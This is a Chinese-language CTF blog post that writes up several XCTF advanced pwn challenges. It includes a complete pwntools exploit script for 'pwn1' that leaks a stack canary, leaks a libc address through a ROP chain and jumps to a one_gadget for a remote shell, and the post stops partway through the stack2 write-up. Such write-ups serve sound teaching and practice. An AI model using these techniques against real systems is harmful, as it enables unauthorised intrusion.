@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>XCTF-Pwn-Advance | N0P3</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="fogotnc连接题目  阅读文本，这个程序大概是一个检查邮箱格式是否合法的程序。 拖进ida分析  分两部分来看main函数，前半部分有数个函数指针，指向的是很多个只输出一条文本的函数。，接着用户的两次输入，可以看到有两处溢出，溢出点分别在33行和41行。继续看下半部分。  有一段代码，解读一下就是在对我们第二次输入的邮箱地址进行逐个字符的分析，当找到‘@’时，就继续寻找‘.’，中间如果有没能找">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XCTF-Pwn-Advance">
+<meta property="og:url" content="https://cdn.n0p3.cn/2020/04/18/XCTF-Pwn-Advance/index.html">
+<meta property="og:site_name" content="N0P3">
+<meta property="og:description" content="fogotnc连接题目  阅读文本，这个程序大概是一个检查邮箱格式是否合法的程序。 拖进ida分析  分两部分来看main函数，前半部分有数个函数指针，指向的是很多个只输出一条文本的函数。，接着用户的两次输入，可以看到有两处溢出，溢出点分别在33行和41行。继续看下半部分。  有一段代码，解读一下就是在对我们第二次输入的邮箱地址进行逐个字符的分析，当找到‘@’时，就继续寻找‘.’，中间如果有没能找">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%8810.04.30.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.54.22.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.55.24.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.58.28.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%888.08.53.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.18.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.26.08.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.00.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.12.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.04.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.30.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.50.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.17.47.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%889.34.53.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.18.58.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.26.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.39.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.49.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.33.55.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/%E5%8F%8D%E5%BA%94%E9%87%9C%E6%8E%A7%E5%88%B6%E5%BC%80%E5%85%B3/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%888.36.03.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175926.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175517.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8810.28.31.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/stack2Ida.jpg">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.07.02.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.44.23.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.45.27.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%881.09.32.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%881.10.25.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%881.10.41.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/warmup/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%889.37.41.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/warmup/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%889.22.26.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.49.21.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.50.37.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.50.45.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.51.33.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.57.51.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.51.10.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.59.42.png">
+<meta property="article:published_time" content="2020-04-18T14:03:23.000Z">
+<meta property="article:modified_time" content="2023-03-02T07:15:05.649Z">
+<meta property="article:author" content="N0P3">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%8810.04.30.png">
+  
+    <link rel="alternate" href="/atom.xml" title="N0P3" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">N0P3</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://cdn.n0p3.cn"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-XCTF-Pwn-Advance" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/18/XCTF-Pwn-Advance/" class="article-date">
+  <time datetime="2020-04-18T14:03:23.000Z" itemprop="datePublished">2020-04-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      XCTF-Pwn-Advance
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="fogot"><a href="#fogot" class="headerlink" title="fogot"></a>fogot</h1><p>nc连接题目</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%8810.04.30.png" alt="nc"></p>
+<p>阅读文本，这个程序大概是一个检查邮箱格式是否合法的程序。</p>
+<p>拖进ida分析</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.54.22.png" alt="main"></p>
+<p>分两部分来看main函数，前半部分有数个函数指针，指向的是很多个只输出一条文本的函数。，接着用户的两次输入，可以看到有两处溢出，溢出点分别在33行和41行。继续看下半部分。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.55.24.png" alt="main2"></p>
+<p>有一段代码，解读一下就是在对我们第二次输入的邮箱地址进行逐个字符的分析，当找到‘@’时，就继续寻找‘.’，中间如果有没能找到的关键字符就执行不同的提示函数，前一段的数个函数指针指向的就是不同的提示函数。每完成一个要求v14就加1，最后调用不同的函数。</p>
+<p>看一下栈</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.58.28.png" alt="栈"></p>
+<p>我们输入的邮箱地址程序里又正好给了可以getflag的函数，所以我们的攻击思路就是，利用溢出漏洞覆盖某个函数指针指向的函数为目标函数，然后满足代码条件使它执行。</p>
+<p>我选了v12函数指针，exp如下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%888.08.53.png" alt="exp"></p>
+<p>‘<a href="mailto:&#x61;&#64;&#x61;&#x2e;&#x63;&#x6f;&#x6d;&#x6d;">&#x61;&#64;&#x61;&#x2e;&#x63;&#x6f;&#x6d;&#x6d;</a>’最后会调用v12，后面的部分覆盖v12指向的函数。</p>
+<h1 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h1><p>连接题目看一下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.18.png" alt="nc"></p>
+<p>可以选择攻击方式，栈溢出或者格式化字符串，但是这道题真的是想考察这两个知识而已吗？</p>
+<p>拖进ida分析</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.26.08.png" alt="main"></p>
+<p>可以看出程序有canary保护</p>
+<p>main函数就是让用户选择，然后调用不同的函数的，主要看sub_4008EB和sub_400960</p>
+<p>sub_4008EB</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.00.png" alt="4008eb"></p>
+<p>如题目所说，确实存在一个格式化字符串漏洞，再去看sub_400960</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.12.png" alt="400960"></p>
+<p>同样也真的存在一个栈溢出漏洞，那我们的攻击思路就有了：</p>
+<p>先利用格式化字符串漏洞得到canary的值，再利用栈溢出漏洞构造rop链调用flag函数。canary的位置，首先计算步长，也就是printf取参数指针到buf的距离，测试得出是6，再加上buf到v2的距离0x90-0x8&#x3D;0x88(十进制17)，所以17+6&#x3D;23</p>
+<p>exp如下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.04.png" alt="exp"></p>
+<p>花了我最长时间的地方居然是处理接收到的canary值，很多写法都莫名报错，最后这样写是可以的。</p>
+<h1 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn-200"></a>pwn-200</h1><p><em>*这题用到pwntools的一个功能DynELF</em></p>
+<p>nc连接只有一次输出一次输入，拖进ida分析</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.30.png" alt="main"></p>
+<p>定义了很多变量，但是也没用到，调用了sub_8048484</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.50.png" alt="8048484"></p>
+<p>很明显在line 6存在栈溢出漏洞，但是没有system函数，也没有shellcode，所以要用到DynELF。<em>（libcSearch也是查找libc用的，但是我并没有用过）</em></p>
+<p>exp如下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.17.47.png" alt="exp"></p>
+<p>在使用DynELF的功能前需要先设定一个dyn对象，在line 12，第一个参数指定leak地址用的函数，第二个参数是目标程序。</p>
+<p><em>DynELF的lookup函数就是利用我们写的leak函数来循环爆破寻找system的地址，leak函数有一定的格式。</em></p>
+<p>shellcode可以通过一段可用的bss段储存</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%889.34.53.png" alt="bss"></p>
+<p>exp逻辑不复杂，但是要注意堆栈的恢复和一些细节。</p>
+<h1 id="Pwn-100"><a href="#Pwn-100" class="headerlink" title="Pwn-100"></a>Pwn-100</h1><p><em>*这道题花了很长时间，主要花时间在想用DynELF做，到最后也没有写出来，还是用LibcSearcher解了。</em></p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.18.58.png" alt="nc"></p>
+<p>链接看一下，直接有输入，一直输一直输，要很长才会输出一个bye～，ida看一下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.26.png" alt="ida"></p>
+<p>主函数没东西，跟踪到40068E看一下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.39.png" alt="68e"></p>
+<p>声明了一个v1，调用40063D，注意传参传了一个200，继续看</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.49.png" alt="63d"></p>
+<p>一个执行200次的循环，循环体是一个只读入1个字节的read，显然这里存在溢出。</p>
+<p>exp：</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.33.55.png" alt="exp"></p>
+<p>第16行为什么这样写，需要自己去调试出来。</p>
+<p><em>LibcSearcher和Ropgadget真好用。</em></p>
+<h1 id="反应釜开关控制"><a href="#反应釜开关控制" class="headerlink" title="反应釜开关控制"></a>反应釜开关控制</h1><p>有故事背景，还有多层的代码，感觉是个好玩的题，结果一看发现就是简单的栈溢出</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/%E5%8F%8D%E5%BA%94%E9%87%9C%E6%8E%A7%E5%88%B6%E5%BC%80%E5%85%B3/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%888.36.03.png" alt="exp"></p>
+<p>非常简单，看了官方wp发现这原来是一道盲打。emmm，果然是道好题。</p>
+<h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p><em>*因为期末导致一段时间没有做pwn了，拿这道题找找感觉</em></p>
+<p>题目描述没有过多信息，看题。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175926.png" alt="sec"></p>
+<p>64位。</p>
+<p>三个选项，1.储存，2.打印，3.退出</p>
+<p>看main函数</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175517.png" alt="main"></p>
+<p>s的大小是0x80个字节，read却可以读取0x100个字节，存在很明显的溢出。但是有canary保护所以我们首先要泄漏canary。之前利用过格式化字符串泄漏canary，这次要利用puts函数的特性来泄漏。</p>
+<p>puts函数只有遇到空字节才会停止输出，即使是0a（换行）也不会停止。canary的第一个字节是空字节，所以puts不会把canary输出，我们只要溢出覆盖掉canary的第一个字节就可以把canary泄漏出来了。</p>
+<p>s距离canary 0x88个字节，要覆盖掉canary的首位就构造一个0x89个字符的payload。</p>
+<p><code>payload=0x85*&#39;a&#39;+&#39;N0P3&#39;</code></p>
+<p>获得canary之后就可以进一步泄漏库函数地址计算offset了。</p>
+<p><code>payload=0x84*&#39;a&#39;+&#39;N0P3&#39;+p64(canary)+&#39;b&#39;*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</code></p>
+<p>小片段是通过ROPgadget找到的。</p>
+<p>获得offset之后就可以按照一般的ret2libc方法get shell了。但是这里对payload的长度有限制（0x100），所以用one_gadget来解。</p>
+<p>最后的payload</p>
+<p><code>payload=0x84*&#39;a&#39;+&#39;N0P3&#39;+p64(canary)+&#39;b&#39;*0x8+p64(GetShell)</code></p>
+<p>Exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">res=remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">36024</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">res.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">payload=<span class="number">0x85</span>*<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;N0P3&#x27;</span></span><br><span class="line">res.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">res.send(payload)</span><br><span class="line"><span class="comment">#res.recv()不知道为什么不需要接收</span></span><br><span class="line">res.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">res.send(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">canary_raw=res.recvuntil(<span class="string">&#x27;\n---&#x27;</span>)</span><br><span class="line">canary=u64(<span class="string">&#x27;\x00&#x27;</span>+canary_raw[<span class="number">137</span>:<span class="number">137</span>+<span class="number">7</span>])<span class="comment">#得到canary(canary的高位被我们覆盖了，补一个）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Get Canary!&#x27;</span>)</span><br><span class="line"><span class="comment">#--------------------------------------------------------</span></span><br><span class="line"><span class="comment">#ROPgadget --binary babystack --only &quot;pop|ret&quot;|grep &quot;rdi&quot;</span></span><br><span class="line">start_addr=<span class="number">0x400720</span></span><br><span class="line">pop_rdi=<span class="number">0x400a93</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=<span class="number">0x400690</span></span><br><span class="line">payload=<span class="number">0x84</span>*<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;N0P3&#x27;</span>+p64(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">res.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">res.send(payload)</span><br><span class="line">res.recv()<span class="comment">#需要接收一次空</span></span><br><span class="line">res.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">res.send(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">puts_got=u64(res.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Get Puts_Got!&#x27;</span>)</span><br><span class="line"><span class="comment">#--------------------------------------------------------</span></span><br><span class="line"><span class="comment">#One_gadget </span></span><br><span class="line">shell= <span class="number">0x45216</span></span><br><span class="line">puts_libc=libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">offset=puts_got-puts_libc</span><br><span class="line">GetShell=offset+shell</span><br><span class="line">payload=<span class="number">0x84</span>*<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;N0P3&#x27;</span>+p64(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(GetShell)</span><br><span class="line">res.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">res.send(payload)</span><br><span class="line"><span class="comment">#res.recv()不知道为什么不需要接收</span></span><br><span class="line">res.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">res.send(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><em>在ida的伪代码的36行有一个sub_400826函数，是puts的再封装，无额外代码。但是这个函数却存在“失效”的现象。理论上在exp每次发送完payload后都应该接收一次空，再接收主界面字符串。但是经过测试只有第二次payload发送后才需要。具体原因未知，麻烦大佬路过解释指点一下。</em></p>
+<h1 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h1><p><em>*终于遇到了必须动调的题目了</em></p>
+<p>看一下程序的情况</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8810.28.31.png"></p>
+<p>32位的，并且有canary保护，估计又要绕过canary了。</p>
+<p>程序是一个平均数计算器。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/stack2Ida.jpg" alt="ida"></p>
+<p>3号更换数字功能没有对用户输入的位置进行检查，存在数组越界漏洞。这个漏洞意味着我们可以对从数组的首地址开始到<strong>低地址</strong>方向上的所有数据进行更改。</p>
+<p>那么我们就可以直接绕过canary以“合法”的方式修改返回地址，构造rop。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.07.02.png"></p>
+<p>在函数列表里有一个函数hackhere，直接开了bash。那么我们似乎只要调用这个函数就可以了。接下来就是最重要的找偏移，从数组首地址到返回地址的距离是多少。起初我是以ida静态分析的栈来算的，得到的是0x74。怎么都不对，后来看了其他师傅的wp发现原来程序实际运行时的偏移不一样。</p>
+<p>所以我们要动态调试一下。</p>
+<p>我在line 30下了断点，因为此处会向数组存储数据，第一次存储数据时的eax的值就是数组的首栈地址。</p>
